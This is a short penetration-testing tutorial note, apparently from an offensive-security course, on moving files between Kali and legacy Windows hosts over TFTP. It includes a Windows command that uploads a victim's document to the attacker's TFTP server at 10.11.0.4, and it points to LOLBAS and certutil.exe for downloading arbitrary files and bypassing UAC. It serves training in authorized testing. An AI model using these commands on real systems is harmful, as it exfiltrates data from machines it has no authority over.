The previous transfer methods work on Windows Versions newer than Win7 and Server 2008 R2. 

Powershell was not installed by default on XP and Server 2003.

VBScript and FTP methods are valid, but lets try TFTP.

TFTP is a UDP based file transfer protocol that's often restricted by corporate egress firewall rules. 

Note that TFTP is NOT installed by default on Win7, 2008 and newer.

### Kali:
Install and configure a TFTP server, create directory to store a serve files:
` sudo apt update && sudo apt install atftp`
` sudo mkdir /tftp`
`sudo chown nobody: /tftp`
`sudo atftpd --daemon --port 69 /tftp`

### Windows:
Upload files to Kali TFTP server:
`tftp -i 10.11.0.4 put important.docx`
**-i** Specify binary image to transfer
**put** initiate transfer

***
For some incredibly interesting ways to use common Windows utilities for file
operations, program execution, UAC bypass, and much more, see the Living Off
The Land Binaries And Scripts (LOLBAS) project,401 maintained by Oddvar Moe
and several contributors, which aims to “document every binary, script, and
library that can be used for [these] techniques.” For example, the certutil.exe402
program can easily download arbitrary files and much more.
***





